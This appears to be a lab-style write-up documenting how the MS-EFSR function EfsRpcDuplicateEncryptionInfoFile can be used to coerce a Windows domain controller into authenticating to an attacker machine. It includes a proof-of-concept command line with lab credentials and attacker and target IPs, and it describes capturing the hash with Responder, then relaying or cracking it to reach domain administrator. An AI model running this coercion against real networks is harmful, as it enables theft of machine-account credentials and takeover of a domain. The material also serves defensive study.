# MS-EFSR - Remote call to EfsRpcDuplicateEncryptionInfoFile (opnum 13)

## Summary

 - **Protocol**: [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)

 - **Protocol UUID**: c681d488-d850-11d0-8c52-00c04fd90f7e

 - **Protocol version**: 1.0

 - **SMB Named pipe**: `\pipe\efsrpc`

 - **Function name**: [`EfsRpcDuplicateEncryptionInfoFile`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/b39ec3e2-d3f0-4934-925e-74032365f9d2)

 - **Function operation number**: `13`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\pipe\efsrpc` and bind to the desired [`MS-EFSR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) protocol (with uuid `c681d488-d850-11d0-8c52-00c04fd90f7e` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-EFSR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\pipe\efsrpc` This pipe is connected to the protocol [[MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31) and allows to call RPC functions of this protocol. We will then call the remote [`EfsRpcDuplicateEncryptionInfoFile`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/b39ec3e2-d3f0-4934-925e-74032365f9d2) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
EfsRpcDuplicateEncryptionInfoFile('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
DWORD EfsRpcDuplicateEncryptionInfoFile(
   [in] handle_t binding_h,
   [in, string] wchar_t* SrcFileName,
   [in, string] wchar_t* DestFileName,
   [in] DWORD dwCreationDisposition,
   [in] DWORD dwAttributes,
   [in, unique] EFS_RPC_BLOB* RelativeSD,
   [in] BOOL bInheritHandle
 );
```

## References

 - Documentation of protocol [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31

 - Documentation of function `EfsRpcDuplicateEncryptionInfoFile`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/b39ec3e2-d3f0-4934-925e-74032365f9d2